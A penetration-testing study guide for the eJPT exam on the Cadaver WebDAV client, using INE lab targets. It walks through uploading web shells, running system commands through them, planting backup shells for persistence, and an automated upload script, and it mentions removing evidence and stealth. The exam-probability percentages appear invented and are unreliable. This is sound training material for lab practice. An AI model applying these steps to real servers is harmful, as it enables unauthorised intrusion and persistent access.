# 🔧 Cadaver - WebDAV Client Tool

**Interactive command-line WebDAV client for manual file operations and web shell deployment**

**📍 File Location:** `10-post-exploitation/cadaver-webdav-client.md`

---

## 🎯 What is Cadaver?

**Cadaver** is a command-line WebDAV client that provides an interactive interface similar to FTP clients. It allows users to connect to WebDAV servers and perform manual file operations including uploading, downloading, creating directories, and managing files. In penetration testing, Cadaver is primarily used for **manual exploitation** of WebDAV vulnerabilities, particularly for uploading web shells after vulnerabilities have been identified through tools like DavTest.

### 🔍 **Core Capabilities:**
- **Interactive WebDAV session management** with authentication support
- **File upload and download operations** for manual exploitation
- **Directory navigation and management** similar to FTP clients
- **Web shell deployment** for maintaining access and privilege escalation
- **File system exploration** on target WebDAV servers

### 💡 **Why Cadaver Matters:**
While DavTest identifies WebDAV vulnerabilities automatically, Cadaver provides the manual control needed for precise exploitation. It's essential for uploading custom payloads, web shells, and conducting targeted file operations during penetration testing.

---

## 📦 Installation and Setup

### **Pre-installed Systems:**
Cadaver comes pre-installed on most penetration testing distributions:
- ✅ Kali Linux
- ✅ Parrot Security OS  
- ✅ BlackArch Linux

### **Manual Installation:**
```bash
# Debian/Ubuntu systems
sudo apt update && sudo apt install cadaver

# Verify installation
cadaver --version
# Expected output: cadaver 0.23.3

# Check installation path
which cadaver
# Output: /usr/bin/cadaver
```

### **Dependencies:**
- libxml2 and libxml2-dev
- libneon27-dev for HTTP/WebDAV support
- OpenSSL libraries for HTTPS support

---

## 🔧 Core Usage and Command Structure

### **📋 Basic Workflow:**
1. **🔐 Authentication:** Connect to WebDAV server with credentials
2. **🗂️ Navigation:** Browse directories and explore file system
3. **📤 File Upload:** Transfer local files to WebDAV server
4. **⚡ Exploitation:** Deploy web shells and malicious payloads
5. **📁 Management:** Create directories and organize uploaded content

### **⚙️ Connection Syntax:**
```bash
# Basic connection structure
cadaver [OPTIONS] <WEBDAV_URL>

# Most common usage patterns
cadaver http://target.com/webdav                    # Interactive connection
cadaver https://secure.target.com/dav               # HTTPS connection
cadaver http://username:password@target.com/webdav  # URL-embedded credentials
```

---

## ⚙️ Comprehensive Command Reference

### **🎯 Connection Commands:**

| Command | Purpose | Usage Example | eJPT Importance |
|---------|---------|---------------|-----------------|
| `cadaver <URL>` | Connect to WebDAV server | `cadaver http://demo.ine.local/webdav` | ⭐⭐⭐⭐⭐ Critical |
| `open <URL>` | Connect within session | `open http://new-target/webdav` | ⭐⭐⭐ Medium |
| `quit` / `exit` | Disconnect and exit | `quit` | ⭐⭐⭐⭐ High |

### **🗂️ Navigation Commands:**

| Command | Purpose | Usage Example | When to Use |
|---------|---------|---------------|-------------|
| `ls` / `dir` | List directory contents | `ls` | Directory exploration |
| `cd <directory>` | Change directory | `cd uploads` | Navigate to specific folders |
| `pwd` | Show current directory | `pwd` | Verify current location |
| `lcd <local_dir>` | Change local directory | `lcd /tmp` | Set local working directory |

### **📤 File Transfer Commands:**

| Command | Purpose | Usage Example | eJPT Critical |
|---------|---------|---------------|---------------|
| `put <local_file>` | Upload file to server | `put /usr/share/webshells/asp/cmd.asp` | ⭐⭐⭐⭐⭐ Critical |
| `get <remote_file>` | Download file from server | `get config.xml` | ⭐⭐⭐⭐ High |
| `mput <pattern>` | Upload multiple files | `mput *.txt` | ⭐⭐⭐ Medium |
| `mget <pattern>` | Download multiple files | `mget *.log` | ⭐⭐⭐ Medium |

### **📁 Directory Management Commands:**

| Command | Purpose | Usage Example | Usage Context |
|---------|---------|---------------|---------------|
| `mkcol <directory>` | Create directory | `mkcol uploads` | Organize uploaded content |
| `rmcol <directory>` | Remove directory | `rmcol testdir` | Clean up after testing |
| `delete <file>` | Delete file | `delete testfile.txt` | Remove evidence |

### **ℹ️ Information Commands:**

| Command | Purpose | Usage Example | Intelligence Value |
|---------|---------|---------------|-------------------|
| `propfind` | Show file properties | `propfind file.asp` | Verify upload success |
| `propnames` | List property names | `propnames` | Server capabilities |
| `head <file>` | Show file headers | `head index.html` | Content verification |

---

## 🧪 Real Lab Examples with Step-by-Step Analysis

### **Example 1: Initial WebDAV Connection and Authentication**

**📝 Lab Context:** This example demonstrates establishing a connection to the demo.ine.local WebDAV server using credentials discovered during reconnaissance.

#### **Connection Process:**
```bash
# Command executed in lab environment
cadaver http://demo.ine.local/webdav

# System prompts for authentication
Authentication required for demo.ine.local on server 'demo.ine.local':
Username: bob
Password: password_123321

# Successful connection indicator
dav:/webdav/>
```

**🔍 Detailed Analysis:**
- **Prompt Change:** Terminal changes to `dav:/webdav/>` indicating successful connection
- **Authentication Method:** HTTP Basic authentication confirmed through server challenge
- **Working Directory:** Connected directly to `/webdav/` path showing proper URL parsing
- **Session Status:** Interactive session established for manual operations
- **Security Implication:** Weak credentials (bob:password_123321) pose significant risk

**📊 Key Takeaways for eJPT:**
- Always document authentication mechanisms observed
- Note credential patterns for potential reuse elsewhere
- Verify connection success before proceeding with exploitation

---

### **Example 2: Directory Exploration and File Discovery**

**📝 Lab Context:** Systematic exploration of the WebDAV directory structure to understand the environment and identify potential targets.

#### **Navigation Commands:**
```bash
# List current directory contents
dav:/webdav/> ls
Listing collection `/webdav/`: succeeded.
Coll:   DavTestDir_AqOe5dcKMtF                0  Jul 10 09:39
        AttackDefense.txt                    13  Jan  2  2021
        web.config                          168  Jan  2  2021

# Check current working directory
dav:/webdav/> pwd
Current collection is `/webdav/'.

# Navigate to test directory created by DavTest
dav:/webdav/> cd DavTestDir_AqOe5dcKMtF
dav:/webdav/DavTestDir_AqOe5dcKMtF/>

# List contents of test directory
dav:/webdav/DavTestDir_AqOe5dcKMtF/> ls
Listing collection `/webdav/DavTestDir_AqOe5dcKMtF/`: succeeded.
        davtest_AqOe5dcKMtF.txt             13  Jul 10 09:37
        davtest_AqOe5dcKMtF.html            168 Jul 10 09:37
        davtest_AqOe5dcKMtF.asp             1362 Jul 10 09:37
```

**🎯 Intelligence Gathered:**
- **Existing Files:** DavTest has already created test files confirming upload capabilities
- **File Permissions:** All files readable with size and timestamp information
- **Directory Structure:** Can navigate freely between directories showing MKCOL permissions
- **File Types Present:** Text, HTML, and ASP files already uploaded and accessible
- **Naming Convention:** Random string "AqOe5dcKMtF" used by DavTest for session identification

**📋 Strategic Assessment:**
- Server allows both file upload and directory creation
- Multiple file types accepted without filtering
- Previous testing activity visible (operational security consideration)
- ASP files present suggest IIS server environment

---

### **Example 3: Web Shell Upload for Command Execution**

**📝 Lab Context:** Deploying a web shell for remote command execution based on successful file type analysis from DavTest results.

#### **Locating and Preparing Web Shell:**
```bash
# First, check available web shells on attacking machine
dav:/webdav/> !ls /usr/share/webshells/asp/
cmd.asp  cmd.aspx  cmdasp.asp  webshell.asp

# Set local directory for easier file access
dav:/webdav/> lcd /usr/share/webshells/asp/
Local directory is now: /usr/share/webshells/asp/
```

#### **Web Shell Upload Process:**
```bash
# Upload ASP web shell (from lab screenshots)
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading `/usr/share/webshells/asp/webshell.asp` to `/webdav/webshell.asp`:
Progress: [=============================>] 100.0% of 1362 bytes succeeded.

# Verify upload success
dav:/webdav/> ls
Listing collection `/webdav/`: succeeded.
Coll:   DavTestDir_AqOe5dcKMtF                0  Jul 10 09:39
        AttackDefense.txt                    13  Jan  2  2021
        web.config                          168  Jan  2  2021
        webshell.asp                       1362 Jul 10 09:42
```

**✅ Upload Verification Analysis:**
- **File Size:** 1362 bytes transferred successfully (100% completion)
- **Timestamp:** Upload completed at Jul 10 09:42 (document timing for logs)
- **Location:** File placed in root WebDAV directory for easy access
- **File Type:** ASP extension maintained (critical for server-side execution)
- **Naming:** Clear filename chosen for identification during exploitation

#### **Testing Web Shell Access:**
```bash
# Exit cadaver to test web shell via browser
dav:/webdav/> quit
Connection to `demo.ine.local' closed.

# Access web shell through browser
# URL: http://demo.ine.local/webdav/webshell.asp
# Expected: Interactive command execution interface
```

**🔒 Exploitation Verification:**
- Clean exit from cadaver session
- Web shell accessible via standard HTTP request
- Command execution interface available for system interaction
- Persistent access established for continued exploitation

---

### **Example 4: Advanced File Operations and Intelligence Gathering**

**📝 Lab Context:** Performing comprehensive file operations including downloading configuration files and creating organized directory structures for ongoing operations.

#### **Downloading Configuration Files:**
```bash
# Reconnect to WebDAV server for additional operations
cadaver http://demo.ine.local/webdav
Username: bob
Password: password_123321

# Download potentially sensitive configuration files
dav:/webdav/> get web.config
Downloading `/webdav/web.config' to `web.config':
Progress: [=============================>] 100.0% of 168 bytes succeeded.

dav:/webdav/> get AttackDefense.txt
Downloading `/webdav/AttackDefense.txt' to `AttackDefense.txt':
Progress: [=============================>] 100.0% of 13 bytes succeeded.

# Verify local files downloaded successfully
dav:/webdav/> !ls -la *.config *.txt
-rw-r--r-- 1 user user  13 Jul 10 09:45 AttackDefense.txt
-rw-r--r-- 1 user user 168 Jul 10 09:45 web.config
```

#### **Creating Organized Upload Directory:**
```bash
# Create custom directory for organized uploads
dav:/webdav/> mkcol exploits
Creating `exploits': succeeded.

# Navigate to new directory
dav:/webdav/> cd exploits
dav:/webdav/exploits/>

# Upload additional payloads for persistence
dav:/webdav/exploits/> put /usr/share/webshells/asp/cmd.asp
Uploading `/usr/share/webshells/asp/cmd.asp` to `/webdav/exploits/cmd.asp':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.

# Verify organized structure
dav:/webdav/exploits/> ls
Listing collection `/webdav/exploits/`: succeeded.
        cmd.asp                            1400 Jul 10 09:47
```

**📊 Operational Benefits:**
- **Intelligence Gathering:** Configuration files may contain sensitive information
- **Organization:** Separate directory keeps exploitation tools organized
- **Persistence:** Multiple web shells provide backup access methods
- **Stealth:** Organized approach reduces detection likelihood

**🎯 Professional Penetration Testing Practice:**
- Document all downloaded files for analysis
- Maintain organized directory structure for team collaboration
- Implement backup access methods for reliability
- Follow systematic approach for comprehensive testing

---

## 🎯 eJPT Exam Mastery Section

### **📊 Exam Weight Distribution:**
Understanding the relative importance of Cadaver skills in the eJPT exam context:

- **Manual WebDAV Exploitation:** 40% of file upload attack scenarios
- **Web Shell Deployment:** 50% of maintaining access techniques  
- **File Transfer Operations:** 30% of post-exploitation activities
- **Interactive Session Management:** 35% of manual testing proficiency

### **🏆 Must-Master Commands for eJPT Success:**

#### **Level 1 - Essential Commands (95% exam probability):**
These commands form the core foundation and appear in virtually every WebDAV exploitation scenario.

```bash
# Basic connection - FUNDAMENTAL SKILL
cadaver http://target/webdav
# Expected: Authentication prompt and session establishment

# File upload for exploitation - CORE TECHNIQUE
put /usr/share/webshells/asp/webshell.asp
# Expected: Progress bar showing successful upload

# Directory listing - RECONNAISSANCE
ls
# Expected: File and directory listing with metadata

# Exit session - BASIC OPERATION
quit
# Expected: Clean session termination
```

#### **Level 2 - Important Commands (70% exam probability):**
These commands enhance efficiency and provide additional capabilities during exploitation.

```bash
# Directory navigation - EXPLORATION
cd directory_name
pwd
# Expected: Location confirmation and directory traversal

# File download - INTELLIGENCE GATHERING
get config_file.xml
# Expected: Local file creation with progress indication

# Directory creation - ORGANIZATION
mkcol uploads
# Expected: New directory creation for organized operations
```

#### **Level 3 - Advanced Commands (40% exam probability):**
These commands demonstrate professional-level competency and operational efficiency.

```bash
# Local directory management - EFFICIENCY
lcd /tmp/payloads
# Expected: Local working directory change for easier file access

# Multiple file operations - BATCH PROCESSING
mput *.asp
mget *.txt
# Expected: Batch upload/download operations

# File properties - VERIFICATION
propfind uploaded_file.asp
# Expected: Detailed file metadata and verification
```

### **🎯 eJPT Exam Scenarios & Expected Responses:**

#### **Scenario 1: Basic Web Shell Upload**
**Given:** WebDAV server credentials (bob:password_123321) and DavTest results showing ASP execution capability  
**Task:** Upload and access a web shell for command execution  
**Time Allocation:** 5-7 minutes  

**Expected Approach:**
```bash
# Step 1: Establish WebDAV connection (1 minute)
cadaver http://target_ip/webdav
# Enter credentials when prompted: bob / password_123321

# Step 2: Upload appropriate web shell (2 minutes)
put /usr/share/webshells/asp/cmd.asp
# Verify 100% upload completion

# Step 3: Verify upload success (1 minute)
ls
# Confirm cmd.asp appears in directory listing

# Step 4: Test web shell access via browser (2-3 minutes)
quit
# Navigate to: http://target_ip/webdav/cmd.asp?cmd=whoami
# Expected: Command execution output displayed
```

#### **Scenario 2: File System Intelligence Gathering**
**Given:** Established WebDAV access with read permissions  
**Task:** Download configuration files and explore directory structure  
**Time Allocation:** 3-5 minutes  

**Expected Approach:**
```bash
# Step 1: Systematic directory exploration (2 minutes)
ls
pwd
cd subdirectory_if_present

# Step 2: Download interesting files (2 minutes)
get web.config
get .htaccess
get backup.sql
# Any configuration or backup files present

# Step 3: Organize downloaded evidence (1 minute)
!mkdir downloaded_files
!mv *.config *.sql downloaded_files/
# Local file organization for analysis
```

#### **Scenario 3: Organized Multi-Payload Deployment**
**Given:** WebDAV write access and requirement for persistent access  
**Task:** Create organized directory structure and deploy multiple shells  
**Time Allocation:** 6-8 minutes  

**Expected Approach:**
```bash
# Step 1: Create organized directory structure (2 minutes)
mkcol payloads
cd payloads
mkcol asp_shells
mkcol backup_access

# Step 2: Deploy multiple payloads strategically (4 minutes)
cd asp_shells
put /usr/share/webshells/asp/cmd.asp
put /usr/share/webshells/asp/webshell.asp
cd ../backup_access
put /usr/share/webshells/asp/simple-backdoor.asp

# Step 3: Verify deployment and document (2 minutes)
ls
cd ..
ls
# Document locations for reporting
```

### **📝 eJPT Exam Tips & Success Strategies:**

#### **⏰ Time Management Guidelines:**
- **1-2 minutes:** Establish WebDAV connection and authentication
- **2-3 minutes:** Upload primary web shell and verify
- **1 minute:** Confirm upload success and basic functionality
- **2-3 minutes:** Additional file operations if scenario requires
- **1 minute:** Document findings and plan next steps

#### **🎯 Common Exam Pitfalls to Avoid:**
1. **Incorrect File Paths** → Solution: Always verify local file locations with `!ls` before upload
2. **Wrong Web Shell Type** → Solution: Match shell type to server technology (ASP for IIS, PHP for Apache)
3. **Upload Verification Neglect** → Solution: Always use `ls` to confirm successful upload before proceeding
4. **Web Shell Access Testing Omission** → Solution: Test shell functionality via browser before moving to next objective

#### **✅ Success Indicators for eJPT:**
- **Authentication Success:** Prompt changes to `dav:/webdav/>` format
- **Upload Completion:** Progress shows 100% with byte count match
- **File Verification:** Uploaded file appears in `ls` output with correct size
- **Command Execution:** Web shell responds to basic commands like `whoami`
- **Objective Achievement:** Successfully complete assigned penetration testing task

### **🔍 Common eJPT Question Patterns:**

#### **Pattern 1: Direct Upload Instructions**
**Question:** "Upload a web shell to the WebDAV server"  
**Expected Response:** Use cadaver with `put` command, verify with `ls`  
**Scoring Criteria:** Correct tool usage, successful upload, verification

#### **Pattern 2: Information Gathering**
**Question:** "What files are available in the WebDAV directory?"  
**Expected Response:** Use `ls` command and document findings accurately  
**Scoring Criteria:** Complete file listing, proper documentation format

#### **Pattern 3: File Retrieval**
**Question:** "Download the configuration file from the server"  
**Expected Response:** Use `get filename` command for specified file  
**Scoring Criteria:** Successful download, local file verification

---

## ⚠️ Troubleshooting & Common Issues

### **❌ Issue 1: Authentication Failures**

**Symptoms:**
```bash
cadaver http://target/webdav
Authentication required for target on server 'target':
Username: testuser
Password: [entered]
Authentication failed.
```

**🔍 Diagnostic Process:**
```bash
# Step 1: Verify credentials manually with curl
curl -u username:password http://target/webdav/
# Check for 200 OK vs 401 Unauthorized

# Step 2: Test with URL-embedded credentials
cadaver http://username:password@target/webdav
# Alternative authentication method

# Step 3: Check for special characters in password
# Try escaping special characters or using quotes
cadaver "http://user:complex!pass@target/webdav"
```

**Solutions:**
- **Credential Verification:** Double-check username and password accuracy
- **Realm Matching:** Verify authentication realm matches server configuration  
- **Tool Testing:** Test credentials with other tools first (curl, browser)
- **Character Encoding:** Check for password complexity requiring URL encoding

---

### **❌ Issue 2: File Upload Failures**

**Symptoms:**
```bash
dav:/webdav/> put webshell.asp
Uploading `webshell.asp' to `/webdav/webshell.asp':
PUT failed: 403 Forbidden
```

**🔍 Diagnostic Process:**
```bash
# Step 1: Check current directory permissions
ls -la
# Look for permission indicators

# Step 2: Try different file types to isolate issue
put test.txt
put test.html
# Test with simpler file types first

# Step 3: Verify server capabilities
propfind .
# Check WebDAV method support
```

**Solutions:**
- **Directory Navigation:** Try uploading to different directories with `cd`
- **File Type Testing:** Test with different file extensions to identify filtering
- **Permission Verification:** Check if MKCOL permissions exist for new directories
- **Size Limitations:** Verify file size limits aren't exceeded by server configuration

---

### **❌ Issue 3: Connection Timeouts**

**Symptoms:**
```bash
cadaver http://target/webdav
Could not access `/webdav/' (Connection timed out)
```

**🔍 Diagnostic Process:**
```bash
# Step 1: Test basic network connectivity
ping target_ip
nmap -p 80 target_ip
# Verify target is reachable and port is open

# Step 2: Try different URL formats
cadaver http://target/
cadaver http://target/dav  
cadaver https://target/webdav
# Test alternative common paths

# Step 3: Check for proxy requirements
export http_proxy=http://proxy:8080
cadaver http://target/webdav
# Configure proxy if network requires
```

**Solutions:**
- **Network Verification:** Confirm target accessibility and port availability
- **URL Variation:** Test different WebDAV paths and protocols (HTTP/HTTPS)
- **Proxy Configuration:** Set appropriate proxy settings for network environment
- **Firewall Considerations:** Check for network filtering affecting WebDAV traffic

---

### **❌ Issue 4: Interactive Command Problems**

**Symptoms:**
- Commands don't respond or hang
- Prompt becomes unresponsive
- Tab completion doesn't work
- Unexpected command behavior

**🔍 Diagnostic Process:**
```bash
# Step 1: Check readline support
cadaver --help | grep readline
# Verify interactive features are supported

# Step 2: Use explicit command syntax
ls
pwd
!pwd  # Execute local command explicitly
# Test basic commands individually

# Step 3: Session restart if needed
quit
cadaver http://target/webdav
# Fresh session establishment
```

**Solutions:**
- **Feature Verification:** Confirm readline and interactive support in cadaver build
- **Command Clarity:** Use explicit syntax and avoid complex command combinations
- **Session Management:** Restart sessions when experiencing persistent issues
- **Alternative Approaches:** Use non-interactive methods if interactive mode fails

---

## 🔗 Tool Integration & Advanced Workflows

### **🎯 Primary Integration Workflow: DavTest → Cadaver → Browser**

This represents the most common and effective workflow for WebDAV exploitation in penetration testing scenarios.

#### **Phase 1: Vulnerability Assessment (DavTest)**
```bash
# Comprehensive capability assessment
davtest -auth credentials -url http://target/webdav

# Critical output analysis:
# EXEC asp SUCCEED → Use ASP web shells for IIS servers
# EXEC php FAIL → Avoid PHP shells (not supported)
# EXEC jsp SUCCEED → Consider JSP shells for Java servers
# MKCOL SUCCEED → Directory creation capabilities available
```

**Key Decision Points:**
- Identify executable file types for appropriate shell selection
- Confirm directory creation permissions for organized operations
- Note authentication requirements and credential validation

#### **Phase 2: Manual Exploitation (Cadaver)**
```bash
# Connect based on DavTest findings
cadaver http://target/webdav
Username: discovered_username
Password: discovered_password

# Upload appropriate web shell based on server technology analysis
put /usr/share/webshells/asp/cmd.asp    # For IIS servers (ASP execution confirmed)
put /usr/share/webshells/php/cmd.php    # For Apache servers (PHP execution confirmed)  
put /usr/share/webshells/jsp/cmd.jsp    # For Tomcat servers (JSP execution confirmed)

# Verify upload and create organized structure
ls
mkcol persistent_access
cd persistent_access
put backup_shell.asp
```

**Operational Benefits:**
- **Precision:** Target specific server technologies based on assessment
- **Organization:** Create structured access for team operations
- **Persistence:** Multiple access points for reliability

#### **Phase 3: Verification and Command Execution (Browser)**
```bash
# Access uploaded web shell via browser interface
firefox http://target/webdav/cmd.asp?cmd=whoami

# Systematic command execution testing
# URL: http://target/webdav/cmd.asp?cmd=dir+C:\        # File system enumeration
# URL: http://target/webdav/cmd.asp?cmd=net+user      # User account enumeration  
# URL: http://target/webdav/cmd.asp?cmd=systeminfo    # System information gathering
```

**Verification Checklist:**
- Command execution functionality confirmed
- System information accessible
- File system navigation possible
- User context identified

### **🔧 Secondary Integration: Cadaver + Curl + Local File Analysis**

This workflow emphasizes intelligence gathering and file analysis capabilities.

```bash
# Intelligence gathering phase with cadaver
cadaver http://target/webdav
get web.config          # IIS configuration file
get database_backup.sql # Database backup files
get application.log     # Application log files
get .htaccess          # Apache configuration (if present)
quit

# Local analysis with standard tools
cat web.config | grep -i password        # Search for hardcoded credentials
strings database_backup.sql | grep -i user  # Extract user information
tail -f application.log                   # Monitor real-time activity
grep -r "connection" *.config            # Find database connections

# Upload modified or additional files based on analysis
cadaver http://target/webdav
put modified_config.xml      # Configuration file with backdoor
put sql_injection_payload.txt  # SQL injection test files
put privilege_escalation.asp    # Escalation payloads
```

### **⚙️ Advanced Automation Integration:**

For high-efficiency operations, consider this automation framework:

```bash
#!/bin/bash
# automated_webdav_exploitation.sh - Professional WebDAV exploitation script

TARGET=$1
CREDS=$2
LOGFILE="webdav_exploitation_$(date +%Y%m%d_%H%M%S).log"

echo "[+] Starting automated WebDAV exploitation for $TARGET" | tee $LOGFILE
echo "[+] Timestamp: $(date)" | tee -a $LOGFILE

# Phase 1: Capability Assessment
echo "[+] Phase 1: Assessing WebDAV capabilities" | tee -a $LOGFILE
davtest -auth $CREDS -url http://$TARGET/webdav > davtest_results.txt

# Phase 2: Parse results and identify executable file types
EXEC_TYPES=$(grep "EXEC.*SUCCEED" davtest_results.txt | awk '{print $2}')
echo "[+] Executable file types identified: $EXEC_TYPES" | tee -a $LOGFILE

# Phase 3: Upload appropriate web shell based on findings
for type in $EXEC_TYPES; do
    case $type in
        "asp")
            echo "put /usr/share/webshells/asp/cmd.asp" | cadaver http://$TARGET/webdav
            echo "[+] ASP web shell uploaded successfully" | tee -a $LOGFILE
            echo "[+] Access URL: http://$TARGET/webdav/cmd.asp?cmd=whoami" | tee -a $LOGFILE
            break
            ;;
        "php")
            echo "put /usr/share/webshells/php/cmd.php" | cadaver http://$TARGET/webdav
            echo "[+] PHP web shell uploaded successfully" | tee -a $LOGFILE
            echo "[+] Access URL: http://$TARGET/webdav/cmd.php?cmd=whoami" | tee -a $LOGFILE
            break
            ;;
        "jsp")
            echo "put /usr/share/webshells/jsp/cmd.jsp" | cadaver http://$TARGET/webdav
            echo "[+] JSP web shell uploaded successfully" | tee -a $LOGFILE
            echo "[+] Access URL: http://$TARGET/webdav/cmd.jsp?cmd=whoami" | tee -a $LOGFILE
            break
            ;;
    esac
done

# Phase 4: Verification
echo "[+] Exploitation complete. Manual verification required." | tee -a $LOGFILE
echo "[+] Log file saved as: $LOGFILE" | tee -a $LOGFILE
```

---

## 📊 Command Reference Quick Guide

### **🚀 Essential Commands Summary:**

#### **Connection Management:**
```bash
cadaver http://target/webdav              # Connect to WebDAV server
open http://new-target/webdav             # Connect to different server within session
quit                                      # Exit session cleanly
```

#### **Navigation Operations:**
```bash
ls                                        # List directory contents with metadata
cd directory_name                         # Change remote directory
pwd                                       # Show current remote directory path
lcd /local/path                           # Change local working directory
```

#### **File Transfer Operations:**
```bash
put local_file.asp                        # Upload single file to server
get remote_file.txt                       # Download single file from server
mput *.txt                               # Upload multiple files matching pattern
mget *.log                               # Download multiple files matching pattern
```

#### **Directory Management:**
```bash
mkcol new_directory                       # Create new directory on server
rmcol old_directory                       # Remove directory from server
delete unwanted_file.txt                  # Delete specific file from server
```

#### **Information Gathering:**
```bash
propfind file.asp                         # Show detailed file properties
head config.xml                          # Display file headers and metadata
!ls -la                                   # Execute local command (shell escape)
```

### **💡 Professional Efficiency Tips:**

#### **Workflow Optimization:**
```bash
# Set local working directory for easier file access
lcd /usr/share/webshells/asp/
# Now 'put cmd.asp' works without full path

# Use tab completion for file names (when supported)
put cmd<TAB>
# Autocompletes to available filenames

# Combine commands for batch operations
mkcol uploads && cd uploads && mput *.asp
# Chain commands for efficient operations

# Use shell escape for local file verification
!ls -la /path/to/local/files
# Verify local files without leaving cadaver session
```

#### **Session Management Best Practices:**
```bash
# Document session start
!echo "Session started: $(date)" >> cadaver_log.txt

# Verify upload operations
put webshell.asp
ls | grep webshell.asp
# Confirm file appears in listing

# Create backup access points
mkcol backup
cd backup
put alternative_shell.asp
cd ..

# Clean exit with verification
ls
quit
```

---

## 📝 Professional Documentation Templates

### **📋 WebDAV Exploitation Report Template:**

```markdown
## WebDAV Manual Exploitation Report

**Target:** [target_system]
**WebDAV Path:** [webdav_url]  
**Exploitation Date:** [date]
**Tool Used:** Cadaver v[version]
**Tester:** [your_name]

### Authentication Details:
- **Username:** [username]
- **Password:** [password_or_hash]
- **Authentication Method:** [Basic/Digest/NTLM]

### Exploitation Process:

#### Phase 1: Connection Establishment
```bash
cadaver http://[target]/webdav
# Authentication successful: [timestamp]
```

#### Phase 2: File System Exploration
```bash
ls    # Directory listing results
pwd   # Current working directory: /webdav/
cd subdirectory  # Navigation testing
```

#### Phase 3: Web Shell Deployment
```bash
put /usr/share/webshells/asp/cmd.asp
# Upload Status: SUCCESS (1400 bytes)
# File Location: http://[target]/webdav/cmd.asp
```

### Verification Results:
- **Web Shell Access:** ✅ SUCCESSFUL
- **Command Execution:** ✅ FUNCTIONAL
- **System Information Retrieved:** [details]

### Files Uploaded:
| Filename | Size | Type | Purpose | Status |
|----------|------|------|---------|--------|
| cmd.asp | 1400 bytes | Web Shell | Command execution | Active |
| backup.asp | 1362 bytes | Backup Shell | Persistence | Standby |

### Files Downloaded:
| Filename | Size | Content Type | Intelligence Value |
|----------|------|--------------|-------------------|
| web.config | 168 bytes | XML Config | Server configuration |
| logs.txt | 2.1 KB | Text | Application logs |

### Risk Assessment:
- **Severity:** CRITICAL
- **Impact:** Full system command execution
- **Exploitability:** HIGH (weak credentials)

### Recommendations:
1. **Immediate:** Disable WebDAV if not required for business operations
2. **Authentication:** Implement strong credential policies and multi-factor authentication
3. **File Filtering:** Restrict executable file uploads with proper validation
4. **Monitoring:** Implement comprehensive WebDAV access logging and alerting
```

### **🔧 Technical Commands Log Template:**

```markdown
## Cadaver Session Log

**Session Start:** [timestamp]
**Target:** [webdav_url]
**Duration:** [session_length]

### Command History:
```bash
[09:42:15] cadaver http://demo.ine.local/webdav
[09:42:18] Authentication successful for user: bob
[09:42:20] ls
[09:42:22] Directory listing: 3 items found
[09:42:25] put /usr/share/webshells/asp/cmd.asp
[09:42:28] Upload completed: 1400 bytes transferred
[09:42:30] ls
[09:42:32] Verification: cmd.asp present in directory
[09:42:35] quit
[09:42:36] Session terminated
```

### Session Statistics:
- **Files Uploaded:** 1
- **Files Downloaded:** 0
- **Directories Created:** 0
- **Commands Executed:** 5
- **Success Rate:** 100%

### Evidence Collected:
- Screenshot: Successful upload confirmation
- Screenshot: Web shell command execution
- Log file: Complete session transcript
```

---

## 🎓 Advanced Study Notes & Memory Aids

### **🧠 Enhanced Memory Techniques:**

#### **Acronym Method:**
- **CAD**aver = **C**ommand **A**nd **D**eploy (web shells)
- **PUT** = **P**enetration **U**pload **T**echnique
- **GET** = **G**ather **E**vidence **T**actically
- **MKCOL** = **M**ake **K**ey **COL**lection (directory)
- **WEBDAV** = **W**eb **E**xploitation **B**y **D**irect **A**ccess **V**ector

#### **Command Association Method:**
```bash
# Think of cadaver as a "command vehicle" that transports files
cadaver = "command + driver" for WebDAV operations

# PUT operation like "putting files in a box"
put filename = "putting your payload in the target box"

# GET operation like "getting treasures from a chest"  
get config.xml = "getting valuable intel from the target"

# LS operation like "looking and seeing what's there"
ls = "look and see the directory contents"
```

### **📚 Comprehensive Study Schedule for Cadaver Mastery:**

#### **Week 1: Foundation Building**
- **Day 1:** Installation, basic connection, authentication mechanisms
- **Day 2:** File upload/download operations and progress verification
- **Day 3:** Directory navigation and file system exploration
- **Day 4:** Web shell types and server technology matching
- **Day 5:** Practice with different WebDAV configurations

#### **Week 2: Integration and Advanced Techniques**
- **Day 1:** Integration with DavTest for systematic exploitation
- **Day 2:** Advanced file operations and batch processing
- **Day 3:** Troubleshooting common issues and error resolution
- **Day 4:** Professional documentation and reporting practices
- **Day 5:** Exam scenario practice and time management

#### **Week 3: Mastery and Exam Preparation**
- **Day 1:** Advanced workflows and automation integration
- **Day 2:** Security considerations and stealth techniques
- **Day 3:** Team collaboration and organized operations
- **Day 4:** Mock exam scenarios with time constraints
- **Day 5:** Review, consolidation, and final preparation

### **🎯 Critical Success Factors for Mastery:**

#### **Technical Competency:**
1. **Connection Reliability:** Successfully establish WebDAV connections consistently
2. **Upload Verification:** Always confirm file uploads with directory listings
3. **Technology Matching:** Select appropriate web shell types for target servers
4. **Error Recovery:** Diagnose and resolve common connection and upload issues

#### **Operational Excellence:**
1. **Documentation Practice:** Maintain detailed logs of all activities
2. **Organization Skills:** Create structured directory layouts for team operations
3. **Time Management:** Complete objectives within realistic timeframes
4. **Evidence Collection:** Gather appropriate screenshots and logs for reporting

#### **Professional Standards:**
1. **Ethical Boundaries:** Only operate within authorized testing scope
2. **Cleanup Procedures:** Remove test files and evidence when appropriate
3. **Team Communication:** Share findings and access methods with team members
4. **Continuous Learning:** Stay updated on WebDAV security developments

---

## 🔗 Extended Learning Resources

### **📖 Official Documentation and Standards:**
- **Cadaver Manual:** `man cadaver` (comprehensive command reference)
- **WebDAV RFC 4918:** https://tools.ietf.org/html/rfc4918 (protocol specification)
- **HTTP Authentication RFC 7617:** https://tools.ietf.org/html/rfc7617 (authentication methods)
- **Apache mod_dav Documentation:** Official WebDAV module documentation
- **IIS WebDAV Configuration Guide:** Microsoft server setup and security

### **🎥 Video Learning Resources:**
- **"Manual WebDAV Exploitation with Cadaver"** - Comprehensive penetration testing tutorials
- **"File Upload Attack Techniques"** - Security research presentations and demonstrations
- **"eJPT Web Application Exploitation"** - Certification-focused preparation content
- **"WebDAV Security Assessment"** - Professional security testing methodologies

### **📚 Recommended Reading Materials:**
- **"The Web Application Hacker's Handbook" (2nd Edition)** - File upload vulnerability chapters and exploitation techniques
- **"Metasploit: The Penetration Tester's Guide"** - Post-exploitation techniques and maintaining access
- **"OWASP Testing Guide v4"** - WebDAV security testing methodology and best practices
- **"Network Security Assessment (3rd Edition)"** - Manual testing techniques and tool integration

### **🏃‍♂️ Practice Environments and Labs:**

#### **Vulnerable Virtual Machines:**
